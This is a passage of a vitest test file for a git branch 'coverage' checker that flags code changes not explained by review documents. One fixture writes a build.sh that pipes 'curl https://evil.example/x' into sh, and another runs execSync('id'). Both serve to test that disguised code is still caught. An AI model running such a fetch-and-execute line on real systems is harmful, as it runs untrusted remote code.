// check.cjs --coverage (src/cli/coverage.ts, docs/CHANGES-PLAN.md §13.1) on the real git fixture
// (test/fixtures/git-repo.mjs --explained), built in a temporary folder and copied per test.
import { execFileSync } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { main } from '../../src/cli/check-widgets.ts';
import { idProblem, type CoverageJson } from '../../src/cli/coverage.ts';
import { Git } from '../../src/cli/git.ts';

// Every test runs several git commands; on Windows runners that alone can pass vitest's 5 s default.
vi.setConfig({ testTimeout: 30_000, hookTimeout: 60_000 });

const repo = fileURLToPath(new URL('../../', import.meta.url));
let base = '';
let fixture = '';
let n = 0;

const gitEnv = { ...Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_'))), GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@example.com', GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@example.com' };
const git = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, env: gitEnv, stdio: ['ignore', 'pipe', 'pipe'] }).toString().trim();

beforeAll(() => {
  base = mkdtempSync(join(tmpdir(), 'cx-coverage-'));
  fixture = join(base, 'fixture');
  execFileSync(process.execPath, [join(repo, 'test/fixtures/git-repo.mjs'), fixture, '--explained'], { env: gitEnv });
}, 60_000);

afterAll(() => {
  rmSync(base, { recursive: true, force: true });
});

/** A fresh copy of the fixture. */
function copy(): string {
  const dir = join(base, `copy${n++}`);
  cpSync(fixture, dir, { recursive: true });
  return dir;
}

async function run(args: string[], hooks = {}): Promise<{ code: number; out: string; err: string }> {
  const out: string[] = [];
  const err: string[] = [];
  const code = await main(args, { out: (s) => out.push(s), err: (s) => err.push(s) }, undefined, undefined, { env: gitEnv, ...hooks });
  return { code, out: out.join('\n'), err: err.join('\n') };
}

async function json(args: string[], hooks = {}): Promise<{ code: number; coverage: CoverageJson; findings: { code: string; message: string; file: string; line?: number; severity: string }[]; pin?: { pinned: { anchor: string }[]; held: { anchor: string }[]; id?: string } }> {
  const r = await run([...args, '--json'], hooks);
  return { code: r.code, ...JSON.parse(r.out) };
}

/** Findings name files by their native path: compare with forward slashes on every OS. */
const slash = (s: string) => s.replaceAll('\\', '/');

const status = (c: CoverageJson) => Object.fromEntries(c.files.map((f) => [f.path, f.changes.map((x) => x.status).join(',') || f.kind]));

describe('--coverage on the fixture', () => {
  it('text: the header, what is left, the totals; exit 3', async () => {
    const r = await run(['--coverage', '--base', 'main', '--repo', fixture]);
    expect(r.code).toBe(3);
    expect(r.out).toMatch(/Coverage: base main, merge-base [0-9a-f]{7}, head: working tree; counting \.sidestory\/retry-jitter/);
    expect(slash(r.out)).toMatch(/test\/retry\.test\.ts:11: warning unexplained: lines 11–40 \(\+30\) aren't explained by a sidestory of this branch\./);
    expect(r.out).toContain('3 explained · 2 trivial · 1 left, in 5 files.');
    expect(r.out).not.toContain('unused-anchor');
    // One summary line, last; no widget line when there are no widgets.
    expect(r.out.split('\n').at(-1)).toMatch(/^3 explained · 2 trivial · 1 left, in 5 files\. 0 error\(s\), \d+ warning\(s\)\.$/);
    const withDir = await run([join(fixture, '.sidestory/retry-jitter'), '--coverage']);
    expect(withDir.out).not.toContain('No widgets checked');
    expect(withDir.out.split('\n').at(-1)).toMatch(/^3 explained · 2 trivial · 1 left, in 5 files\. 0 error\(s\), \d+ warning\(s\)\.$/);
  });

  it('--json: the checklist, change by change', async () => {
    const r = await json(['--coverage', '--base', 'main', '--repo', fixture]);
    expect(r.code).toBe(3);
    expect(r.coverage.sidestories).toEqual(['.sidestory/retry-jitter']);
    expect(status(r.coverage)).toEqual({
      'legacy/sleep.ts': 'explained',
      'src/retry/backoff.ts': 'trivial,trivial', // its move from old/ too, covered by its trivial mark
      'src/retry/jitter.ts': 'explained',
      'src/retry/retry.ts': 'explained',
      'test/retry.test.ts': 'unexplained',
    });
    const retry = r.coverage.files.find((f) => f.path === 'src/retry/retry.ts')!.changes[0]!;
    expect(retry).toMatchObject({ old: [5, 5], new: [5, 8], added: 4, removed: 1, by: [{ sidestory: '.sidestory/retry-jitter', anchor: 'retry-loop' }] });
    expect(retry.key).toMatch(/^[0-9a-f]{16}-0$/);
    expect(r.coverage.files.find((f) => f.path === 'src/retry/backoff.ts')).toMatchObject({ oldPath: 'old/backoff.ts', status: 'R' });
    expect(r.coverage.files.find((f) => f.path === 'test/retry.test.ts')!.changes[0]!.uncovered).toEqual([[11, 40]]);
    expect(r.coverage.totals).toMatchObject({ changes: 6, explained: 3, trivial: 2, left: 1, files: 5 });
  });

  it('with the sidestory folder: the same comparison from its own base', async () => {
    const r = await run([join(fixture, '.sidestory/retry-jitter'), '--coverage']);
    expect(r.code).toBe(3);
    expect(r.out).toMatch(/\.sidestory\/retry-jitter: base main, merge-base/);
  });

  it('exit 0 once every change is explained', async () => {
    const dir = copy();
    const m = JSON.parse(readFileSync(join(dir, '.sidestory/retry-jitter/manifest.json'), 'utf8'));
    m.anchors.tests = { file: 'test/retry.test.ts', range: [11, 40] };
    writeFileSync(join(dir, '.sidestory/retry-jitter/manifest.json'), JSON.stringify(m, null, 2));
    const html = readFileSync(join(dir, '.sidestory/retry-jitter/sidestory.html'), 'utf8').replace('</body>', '<section data-explain-anchor="tests"><h2>Tests</h2><p>Jitter stays below the ceiling.</p></section>\n</body>');
    writeFileSync(join(dir, '.sidestory/retry-jitter/sidestory.html'), html);
    const r = await run(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.out).toContain('4 explained · 2 trivial · 0 left, in 5 files.');
    expect(r.code).toBe(0);
  });

  it('exit 1 on errors, which win over unexplained changes', async () => {
    const dir = copy();
    const file = join(dir, '.sidestory/retry-jitter/manifest.json');
    writeFileSync(file, readFileSync(file, 'utf8').replace('"version": 3', '"version": 2'));
    const r = await run(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/manifest\.json:\d+: error version: anchors with side "base" need "version": 3/);
  });

  it('--base unknown: base-not-found, exit 1; usage errors exit 2', async () => {
    const r = await run(['--coverage', '--base', 'nope', '--repo', fixture]);
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/error base-not-found: base "nope" isn't a branch, remote branch or tag here/);
    expect((await run(['--coverage', '--repo', fixture])).code).toBe(2);
    expect((await run(['--coverage', '--base'])).code).toBe(2);
    expect((await run(['--coverage', '--base', 'main', '--committed', '--head', 'a'.repeat(40), '--repo', fixture])).code).toBe(2);
    expect((await run(['--base', 'main', join(fixture, '.sidestory/retry-jitter')])).code).toBe(2);
  });

  it('main when only origin/main exists (a CI checkout)', async () => {
    const clone = join(base, `clone${n++}`);
    execFileSync('git', ['clone', '-q', '--no-local', fixture, clone], { env: gitEnv });
    expect(git(clone, 'branch', '--list', 'main')).toBe('');
    const r = await json(['--coverage', '--base', 'main', '--repo', clone]);
    expect(r.coverage.base).toMatchObject({ spec: 'main', label: 'origin/main' });
    expect(r.coverage.sidestories).toEqual(['.sidestory/retry-jitter']);
    expect(r.coverage.totals.left).toBe(1);
  });

  it('a tag and a branch of the same name: the branch', async () => {
    const dir = copy();
    git(dir, 'tag', 'main', 'feature~1');
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.coverage.base).toMatchObject({ label: 'main', sha: git(dir, 'rev-parse', 'refs/heads/main') });
    expect(r.coverage.mergeBase).toBe(git(dir, 'merge-base', 'refs/heads/main', 'HEAD'));
    git(dir, 'tag', 'v1', 'main~1');
    expect((await json(['--coverage', '--base', 'v1', '--repo', dir])).coverage.base).toMatchObject({ label: 'v1' });
  });

  it('--committed leaves uncommitted edits out; the working tree counts them, untracked files too', async () => {
    const dir = copy();
    writeFileSync(join(dir, 'README.md'), '# Fixture\n\nMore.\n');
    writeFileSync(join(dir, 'notes.txt'), 'untracked\n');
    const working = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(status(working.coverage)).toMatchObject({ 'README.md': 'unexplained', 'notes.txt': 'unexplained' });
    expect(working.coverage.files.find((f) => f.path === 'notes.txt')!.status).toBe('A');
    const committed = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    expect(committed.coverage.head).toBe(git(dir, 'rev-parse', 'HEAD'));
    expect(Object.keys(status(committed.coverage))).not.toContain('README.md');
    expect(Object.keys(status(committed.coverage))).not.toContain('notes.txt');
    const head = await json(['--coverage', '--base', 'main', '--head', git(dir, 'rev-parse', 'HEAD~1'), '--repo', dir]);
    // Before the sidestory's commit: nothing belongs.
    expect(head.coverage.sidestories).toEqual([]);
  });

  it('--head with a full commit id as the base: that commit is the merge-base once it is an ancestor; base-not-ancestor otherwise', async () => {
    const dir = copy();
    git(dir, 'add', '-A');
    git(dir, 'commit', '-q', '--no-verify', '--allow-empty', '-m', 'review head');
    const head = git(dir, 'rev-parse', 'HEAD');
    const parent = git(dir, 'rev-parse', 'HEAD~1');
    const r = await json(['--coverage', '--base', parent, '--head', head, '--repo', dir]);
    expect(r.coverage.mergeBase).toBe(parent);
    expect(r.coverage.head).toBe(head);
    expect(r.coverage.files).toEqual([]);
    // A commit outside the head's history (same tree, no parent).
    const stranger = git(dir, 'commit-tree', `${head}^{tree}`, '-m', 'stranger');
    const bad = await json(['--coverage', '--base', stranger, '--head', head, '--repo', dir]);
    expect(bad.code).toBe(1);
    expect(bad.findings.find((f) => f.code === 'base-not-ancestor')!.message).toContain(`isn't an ancestor of ${head.slice(0, 12)}`);
    expect(bad.coverage.mergeBase).toBeNull();
  });

  it('--committed counts a sidestory only once it is committed', async () => {
    const dir = copy();
    cpSync(join(dir, '.sidestory/retry-jitter'), join(dir, '.sidestory/extra'), { recursive: true });
    const working = await json([join(dir, '.sidestory/extra'), '--coverage']);
    expect(working.coverage.sidestories).toEqual(['.sidestory/extra', '.sidestory/retry-jitter']);
    const committed = await json([join(dir, '.sidestory/extra'), '--coverage', '--committed']);
    expect(committed.coverage.sidestories).toEqual(['.sidestory/retry-jitter']);
    expect(committed.findings.find((f) => f.code === 'not-belonging')!.message).toMatch(/isn't committed at HEAD/);
  });

  it('pairs an unstaged rename (a deleted tracked file and an untracked one)', async () => {
    const dir = copy();
    renameSync(join(dir, 'docs/notes.md'), join(dir, 'docs/renamed.md'));
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    const f = r.coverage.files.find((x) => x.path === 'docs/renamed.md')!;
    // Paired, and as a move that changed no line, one change (§5.1).
    expect(f).toMatchObject({ oldPath: 'docs/notes.md', status: 'R', kind: 'rename', changes: [{ status: 'unexplained' }] });
    expect(r.findings.some((x) => x.code === 'unexplained' && /^renamed docs\/notes\.md → docs\/renamed\.md: a move can switch code off/.test(x.message))).toBe(true);
    expect(r.coverage.files.find((x) => x.path === 'docs/notes.md')).toBeUndefined();
  });

  it('a sidestory that landed earlier does not belong to a later branch', async () => {
    const dir = copy();
    git(dir, 'checkout', '-q', '-b', 'later');
    // The fixture's sidestory as if it had landed: its manifest is at the merge-base of a branch off feature.
    writeFileSync(join(dir, 'src/retry/jitter.ts'), `${readFileSync(join(dir, 'src/retry/jitter.ts'), 'utf8')}export const more = 1;\n`);
    const r = await json(['--coverage', '--base', 'feature', '--repo', dir]);
    expect(r.coverage.sidestories).toEqual([]);
    const withDir = await json([join(dir, '.sidestory/retry-jitter'), '--coverage', '--base', 'feature']);
    expect(withDir.findings.find((f) => f.code === 'not-belonging')!.message).toMatch(/already exists at the merge-base/);
  });
});

describe('files whose lines cannot be compared (§5.1)', () => {
  const commitAll = (dir: string, msg: string) => {
    git(dir, 'add', '-A');
    git(dir, 'commit', '-q', '--no-verify', '-m', msg);
  };

  it('a glob over binary assets is not broad: binary and LFS files are left out of trivial-broad', async () => {
    const dir = copy();
    mkdirSync(join(dir, 'assets'), { recursive: true });
    for (let i = 0; i < 12; i++) writeFileSync(join(dir, `assets/icon${i}.png`), new Uint8Array([0x89, 0x50, 0, i]));
    const mf = join(dir, '.sidestory/retry-jitter/manifest.json');
    const m = JSON.parse(readFileSync(mf, 'utf8'));
    m.trivialFiles = ['assets/*.png'];
    writeFileSync(mf, JSON.stringify(m, null, 2));
    commitAll(dir, 'icons');
    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    expect(status(r.coverage)['assets/icon0.png']).toBe('trivial');
    expect(r.findings.filter((f) => f.code === 'trivial-broad')).toEqual([]);
  });

  it('covered moves are info lines, folded into one summary past 5 groups', async () => {
    const dir = copy();
    git(dir, 'checkout', '-q', 'main');
    mkdirSync(join(dir, 'x'), { recursive: true });
    for (let i = 1; i <= 6; i++) writeFileSync(join(dir, `x/f${i}.js`), `export const f${i} = ${i};\n`);
    commitAll(dir, 'six files');
    git(dir, 'checkout', '-q', 'feature');
    git(dir, 'merge', '-q', '--no-edit', 'main');
    // Each changes the middle of its name: six renames of their own, all covered by one glob.
    for (let i = 1; i <= 6; i++) git(dir, 'mv', `x/f${i}.js`, `x/f${i}-v2.js`);
    const mf = join(dir, '.sidestory/retry-jitter/manifest.json');
    const m = JSON.parse(readFileSync(mf, 'utf8'));
    m.trivialFiles = ['x/*.js'];
    writeFileSync(mf, JSON.stringify(m, null, 2));
    commitAll(dir, 'renames');
    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    const moved = r.findings.filter((f) => f.code === 'moved');
    expect(moved).toHaveLength(1);
    // Six here, and the fixture's own backoff.ts move.
    expect(moved[0]!.message).toMatch(/^7 moves, each explained or marked trivial: .*renamed x\/f1\.js → x\/f1-v2\.js;/);
  });

  it('a folder moved as a whole is one finding listing the files', async () => {
    const dir = copy();
    mkdirSync(join(dir, 'lib'), { recursive: true });
    git(dir, 'mv', 'README.md', 'lib/README.md');
    git(dir, 'mv', 'docs/notes.md', 'lib/notes.md');
    commitAll(dir, 'move');
    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    // Two moved prefixes ('' → lib for README.md, docs → lib for notes.md): two groups, one finding each.
    const moves = r.findings.filter((f) => f.code === 'unexplained' && /moved/.test(f.message));
    expect(moves.map((f) => f.message.split(':')[0])).toEqual(['moved README.md → lib/README.md', 'moved docs/notes.md → lib/notes.md']);
    // Moved under one new prefix, subfolders kept: one group, its files listed, also in --json.
    const dir2 = copy();
    mkdirSync(join(dir2, 'lib/docs'), { recursive: true });
    git(dir2, 'mv', 'README.md', 'lib/README.md');
    git(dir2, 'mv', 'docs/notes.md', 'lib/docs/notes.md');
    commitAll(dir2, 'move');
    const r2 = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir2]);
    expect(r2.findings.filter((f) => /files moved/.test(f.message)).map((f) => f.message.split(':')[0])).toEqual(['2 files moved . → lib (README.md → lib/README.md, docs/notes.md → lib/docs/notes.md)']);
    const carrier = r2.coverage.files.find((f) => f.path === 'lib/README.md')!.changes[0]!;
    expect(carrier.move).toMatchObject({ label: '2 files moved . → lib', from: '', to: 'lib', files: [{ path: 'lib/README.md' }, { path: 'lib/docs/notes.md' }] });
  });

  it.skipIf(process.platform === 'win32')('a type change (file to link) is one change, with its own finding', async () => {
    const dir = copy();
    rmSync(join(dir, 'README.md'));
    symlinkSync('docs/notes.md', join(dir, 'README.md'));
    commitAll(dir, 'readme becomes a link');
    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    const f = r.coverage.files.find((x) => x.path === 'README.md')!;
    expect(f.kind).toBe('type-change');
    expect(f.changes.map((c) => c.status)).toEqual(['unexplained']);
    expect(r.coverage.totals.left).toBe(2);
    expect(r.findings.find((x) => x.code === 'type-change')!.message).toMatch(/^README\.md changed type \(a file, a link or a submodule\); it counts as one unexplained change\. Mark it in trivialFiles/);
  });

  it('a binary file is one change; the finding suggests a trivialFiles glob, which covers it', async () => {
    const dir = copy();
    writeFileSync(join(dir, 'logo.png'), new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 1, 2, 3]));
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.coverage.files.find((x) => x.path === 'logo.png')).toMatchObject({ kind: 'binary', changes: [{ status: 'unexplained', old: null, new: null }] });
    expect(r.findings.find((x) => x.file.endsWith('logo.png'))!.message).toBe('logo.png is a binary file; it counts as one unexplained change. Mark it in trivialFiles if it needs no explanation (a glob such as "**/*.png" for assets).');
    const mf = join(dir, '.sidestory/retry-jitter/manifest.json');
    writeFileSync(mf, JSON.stringify({ ...JSON.parse(readFileSync(mf, 'utf8')), trivialFiles: ['**/*.png'] }, null, 2));
    const marked = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(marked.coverage.files.find((x) => x.path === 'logo.png')!.changes[0]!.status).toBe('trivial');
  });

  it.skipIf(process.platform === 'win32')('an unsupported path is one change, and the finding says which rule it breaks (device names included)', async () => {
    const dir = copy();
    writeFileSync(join(dir, 'nul.txt'), 'x\n');
    writeFileSync(join(dir, 'tab\tname.txt'), 'x\n');
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.coverage.files.find((x) => x.path === 'nul.txt')).toMatchObject({ kind: 'unsupported', changes: [{ status: 'unexplained' }] });
    expect(r.coverage.files.find((x) => x.path === 'tab\tname.txt')).toMatchObject({ kind: 'unsupported' });
    const msgs = r.findings.filter((x) => x.code === 'unsupported-path').map((x) => x.message);
    expect(msgs.some((m) => m.includes('a Windows device name (con, nul.txt, com1…)') && m.includes('"nul.txt"'))).toBe(true);
    expect(msgs.some((m) => m.includes('a control character'))).toBe(true);
    // Committed, the device name is an ordinary blob: read and compared line by line.
    commitAll(dir, 'odd names');
    const committed = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    expect(committed.coverage.files.find((x) => x.path === 'nul.txt')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 1] }] });
  });

  it('a Git LFS file is one change; fake pointers and replaced pointers count by their lines', async () => {
    const pointer = (n: number) => `version https://git-lfs.github.com/spec/v1\noid sha256:${String(n).repeat(64)}\nsize ${n}\n`;
    const dir = copy();
    writeFileSync(join(dir, 'video.mp4'), pointer(1));
    writeFileSync(join(dir, 'old.mp4'), pointer(2));
    commitAll(dir, 'pointers');
    git(dir, 'checkout', '-q', '-b', 'later');
    // A real pointer moved on; a pointer replaced by code; a script that starts with the version line.
    writeFileSync(join(dir, 'video.mp4'), pointer(3));
    writeFileSync(join(dir, 'old.mp4'), 'module.exports = () => require("child_process").execSync("id");\n');
    writeFileSync(join(dir, 'build.sh'), 'version https://git-lfs.github.com/spec/v1\ncurl https://evil.example/x | sh\n');
    const r = await json(['--coverage', '--base', 'feature', '--repo', dir]);
    const f = (p: string) => r.coverage.files.find((x) => x.path === p)!;
    // A pointer that moved on hides a content change nobody reviews (a .gitattributes line can move scripts into
    // LFS): one change, covered only by trivialFiles.
    expect(f('video.mp4')).toMatchObject({ kind: 'lfs', changes: [{ status: 'unexplained' }] });
    expect(f('old.mp4')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained' }] });
    expect(f('build.sh')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 2] }] });
    expect(r.coverage.totals.notCounted).toBe(0);
  });

  it('code in a sidestory folder counts; only a complete sidestory\'s manifest and page are left out', async () => {
    const dir = copy();
    mkdirSync(join(dir, '.sidestory/helper'), { recursive: true });
    writeFileSync(join(dir, '.sidestory/helper/run.js'), 'module.exports = () => 1;\n');
    writeFileSync(join(dir, '.sidestory/retry-jitter/widget.js'), 'export const w = 1;\n');
    mkdirSync(join(dir, '.sidestory/half'));
    writeFileSync(join(dir, '.sidestory/half/manifest.json'), '{"version":2}\n');
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    const st = status(r.coverage);
    expect(st['.sidestory/helper/run.js']).toBe('unexplained');
    expect(st['.sidestory/retry-jitter/widget.js']).toBe('unexplained');
    expect(st['.sidestory/half/manifest.json']).toBe('unexplained');
    expect(st['.sidestory/retry-jitter/manifest.json']).toBeUndefined();
    expect(st['.sidestory/retry-jitter/sidestory.html']).toBeUndefined();
  });

  it('a rename from code into a sidestory folder: an ordinary rename there, a deletion into its own files', async () => {
    const dir = copy();
    mkdirSync(join(dir, '.sidestory/notes'), { recursive: true });
    git(dir, 'mv', 'src/retry/jitter.ts', '.sidestory/notes/jitter.ts');
    commitAll(dir, 'move into a folder');
    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
    // jitter.ts never existed at the merge-base: added on the branch at its new path, and counted there.
    expect(status(r.coverage)['.sidestory/notes/jitter.ts']).toBe('unexplained');
    // A file from the merge-base renamed (R100) onto a sidestory's own manifest: the deletion counts.
    const dir2 = copy();
    mkdirSync(join(dir2, '.sidestory/notes'), { recursive: true });
    git(dir2, 'mv', 'README.md', '.sidestory/notes/sidestory.html');
    writeFileSync(join(dir2, '.sidestory/notes/manifest.json'), '{"version":2,"title":"N","anchors":{}}\n');
    commitAll(dir2, 'hide a deletion');
    const r2 = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir2]);
    expect(r2.coverage.files.find((x) => x.path === 'README.md')).toMatchObject({ status: 'D', kind: 'text', changes: [{ status: 'unexplained', old: [1, 1] }] });
    expect(r2.coverage.files.find((x) => x.path === '.sidestory/notes/sidestory.html')).toBeUndefined();
  });

  it('archiving a landed sidestory in a branch (§12.4 way 2) is not counted; code slipped into the move is', async () => {
    for (const committedOnly of [true, false]) {
      const dir = copy();
      writeFileSync(join(dir, '.sidestory/retry-jitter/widget.js'), 'export const w = 1;\n');
      commitAll(dir, 'a widget');
      git(dir, 'checkout', '-q', '-b', 'later');
      mkdirSync(join(dir, '.sidestory/archive'));
      git(dir, 'mv', '.sidestory/retry-jitter', '.sidestory/archive/2026-01-01-retry-jitter');
      const mf = join(dir, '.sidestory/archive/2026-01-01-retry-jitter/manifest.json');
      writeFileSync(mf, JSON.stringify({ ...JSON.parse(readFileSync(mf, 'utf8')), landed: { base: 'a'.repeat(40), head: 'b'.repeat(40) } }, null, 2));
      // Code slipped into the archive alongside the move.
      writeFileSync(join(dir, '.sidestory/archive/2026-01-01-retry-jitter/extra.js'), 'module.exports = 1;\n');
      if (committedOnly) commitAll(dir, 'archive');
      const r = await json(['--coverage', '--base', 'feature', ...(committedOnly ? ['--committed'] : []), '--repo', dir]);
      const files = Object.fromEntries(r.coverage.files.map((f) => [f.path, f.kind]));
      expect(files, String(committedOnly)).toEqual({ '.sidestory/archive/2026-01-01-retry-jitter/extra.js': 'archive' });
      expect(r.coverage.totals).toMatchObject({ changes: 1, left: 1 });
      // A widget changed while moving counts.
      writeFileSync(join(dir, '.sidestory/archive/2026-01-01-retry-jitter/widget.js'), 'export const w = 2;\n');
      if (committedOnly) commitAll(dir, 'change the widget');
      const changed = await json(['--coverage', '--base', 'feature', ...(committedOnly ? ['--committed'] : []), '--repo', dir]);
      expect(changed.coverage.files.map((f) => f.path)).toContain('.sidestory/archive/2026-01-01-retry-jitter/widget.js');
    }
  });

  it('a change under .sidestory/archive/ is one change, whatever the file', async () => {
    const dir = copy();
    mkdirSync(join(dir, '.sidestory/archive/2026-01-01-x'), { recursive: true });
    writeFileSync(join(dir, '.sidestory/archive/2026-01-01-x/manifest.json'), '{}\n');
    writeFileSync(join(dir, '.sidestory/archive/2026-01-01-x/run.js'), 'module.exports = 1;\n');
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    for (const p of ['.sidestory/archive/2026-01-01-x/manifest.json', '.sidestory/archive/2026-01-01-x/run.js']) {
      expect(r.coverage.files.find((x) => x.path === p), p).toMatchObject({ kind: 'archive', changes: [{ status: 'unexplained', old: null, new: null }] });
    }
    expect(r.findings.filter((x) => x.code === 'archive-changed')).toHaveLength(2);
  });

  it('a page over the read cap still makes its folder a sidestory of the branch, and coverage incomplete', async () => {
    const dir = copy();
    const page = join(dir, '.sidestory/retry-jitter/sidestory.html');
    writeFileSync(page, readFileSync(page, 'utf8') + `<!-- ${'x'.repeat(10 * 1024 * 1024)} -->\n`);
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(r.coverage.sidestories).toEqual(['.sidestory/retry-jitter']);
    expect(r.coverage.incomplete).toBe(true);
    expect(r.findings.find((x) => x.code === 'coverage-incomplete')!.message).toMatch(/over 10 MB, too large to read/);
    expect(r.findings.map((x) => x.code)).not.toContain('anchor-unused');
    expect(r.code).toBe(3);
  });
});

describe('--pin and --accept with a branch', () => {
  /** Adds a line inside the retry-loop step (src/retry/retry.ts 4–9), after it was pinned. */
  const addInside = (dir: string) => {
    const file = join(dir, 'src/retry/retry.ts');
    const lines = readFileSync(file, 'utf8').split('\n');
    lines.splice(6, 0, 'export const addedLater = 5;');
    writeFileSync(file, lines.join('\n'));
  };
  const manifest = (dir: string) => JSON.parse(readFileSync(join(dir, '.sidestory/retry-jitter/manifest.json'), 'utf8'));

  it('changed-since-pinned: --pin leaves the step and lists it; --accept re-pins it', async () => {
    const dir = copy();
    const sd = join(dir, '.sidestory/retry-jitter');
    addInside(dir);
    const first = await json([sd, '--coverage']);
    expect(first.code).toBe(3);
    const look = first.findings.find((f) => f.code === 'changed-since-pinned')!;
    expect(look.message).toBe('line 7 was added inside step "The retry loop" after it was pinned; update the prose, then --accept retry-loop.');
    expect(look.line).toBe(7);
    expect(first.coverage.files.find((f) => f.path === 'src/retry/retry.ts')!.changes[0]!.status).toBe('needsLook');

    const before = manifest(dir).anchors['retry-loop'];
    const pinned = await run([sd, '--pin', '--coverage']);
    expect(pinned.code).toBe(3);
    expect(pinned.out).toContain('Not re-pinned, because code was added inside them since they were pinned: retry-loop.');
    expect(manifest(dir).anchors['retry-loop']).toEqual(before);

    const accepted = await json([sd, '--accept', 'retry-loop', '--coverage']);
    expect(accepted.pin!.pinned.map((p) => p.anchor)).toEqual(['retry-loop']);
    expect(accepted.findings.map((f) => f.code)).not.toContain('changed-since-pinned');
    expect(manifest(dir).anchors['retry-loop'].quote.exact).toContain('export const addedLater = 5;');
    expect(manifest(dir).version).toBe(3);
    expect(accepted.code).toBe(3); // the test file is still unexplained
  });

  it('--accept an unknown anchor is an error', async () => {
    const r = await run([join(fixture, '.sidestory/retry-jitter'), '--accept', 'nope']);
    expect(r.code).toBe(1);
    expect(r.out).toContain('error accept: --accept nope: no anchor "nope" in manifest.json.');
  });

  it('--pin pins base-side anchors against the merge-base, never the working tree, and writes an id', async () => {
    const dir = copy();
    const sd = join(dir, '.sidestory/retry-jitter');
    const m = manifest(dir);
    delete m.anchors['old-sleep'].quote;
    delete m.id;
    writeFileSync(join(sd, 'manifest.json'), JSON.stringify(m, null, 2));
    // Committed without one, so there is no earlier id to put back.
    git(dir, 'commit', '-q', '-a', '--no-verify', '-m', 'No id');
    // A file at the old path in the working tree must not be what gets pinned.
    mkdirSync(join(dir, 'legacy'));
    writeFileSync(join(dir, 'legacy/sleep.ts'), 'something else entirely\n');
    const r = await json([sd, '--pin'], { newId: () => '01JC0000000000000000000ABC' });
    expect(r.pin!.pinned.map((p) => p.anchor)).toContain('old-sleep');
    expect(r.pin!.id).toBe('01JC0000000000000000000ABC');
    const after = manifest(dir);
    expect(after.anchors['old-sleep'].quote.exact.split('\n')).toEqual(Array.from({ length: 24 }, (_, i) => `export const sleep line ${i + 1};`));
    expect(after.anchors['old-sleep'].side).toBe('base');
    expect(after.id).toBe('01JC0000000000000000000ABC');
  });

  it('missing-id is a hint for a sidestory with a base', async () => {
    const dir = copy();
    const sd = join(dir, '.sidestory/retry-jitter');
    const m = manifest(dir);
    delete m.id;
    writeFileSync(join(sd, 'manifest.json'), JSON.stringify(m, null, 2));
    const r = await run([sd]);
    expect(r.out).toMatch(/info missing-id: No "id"/);
    expect(r.code).toBe(0);
  });
});

describe('stable ids: id-changed and id-removed (docs/COMMENTS-PLAN.md §3.1)', () => {
  const A = '01JC0AANDED00000000000000A';
  const B = '01JC0REP4ACED0000000000000';
  const RETRY = '01JC0RETRYJ1TTER000000000A';
  const page = '<!doctype html><html><body><h1>Landed</h1><section data-explain-anchor="x"><h2>X</h2><p>p</p></section></body></html>\n';
  const landed = (id?: string) => `${JSON.stringify({ version: 2, ...(id ? { id } : {}), title: 'Landed', anchors: { x: { file: 'src/retry/jitter.ts', range: [1, 2] } } }, null, 2)}\n`;
  /** A copy with a landed sidestory committed at HEAD; HEAD is the comparison's merge-base (--base <HEAD>). */
  function withLanded(id: string | null = A): { dir: string; head: string } {
    const dir = copy();
    mkdirSync(join(dir, '.sidestory/landed'), { recursive: true });
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(id ?? undefined));
    writeFileSync(join(dir, '.sidestory/landed/sidestory.html'), page);
    git(dir, 'add', '-A');
    git(dir, 'commit', '-q', '--no-verify', '-m', 'Landed');
    return { dir, head: git(dir, 'rev-parse', 'HEAD') };
  }
  const ids = (r: { findings: { code: string; message: string; severity: string; file: string; line?: number }[] }) => r.findings.filter((f) => f.code.startsWith('id-'));

  it('a changed id is an error, against the merge-base, with the line and the id to put back; exit 1', async () => {
    const { dir, head } = withLanded();
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(B));
    const r = await json(['--coverage', '--base', head, '--repo', dir]);
    expect(ids(r)).toEqual([expect.objectContaining({ code: 'id-changed', severity: 'error', line: 3, file: expect.stringMatching(/[/\\]copy\d+[/\\]\.sidestory[/\\]landed[/\\]manifest\.json$/) })]);
    expect(ids(r)[0]!.message).toContain(`it was "${A}" at the merge-base (${head.slice(0, 7)})`);
    expect(ids(r)[0]!.message).toContain(`Put back "id": "${A}"`);
    expect(r.code).toBe(1);
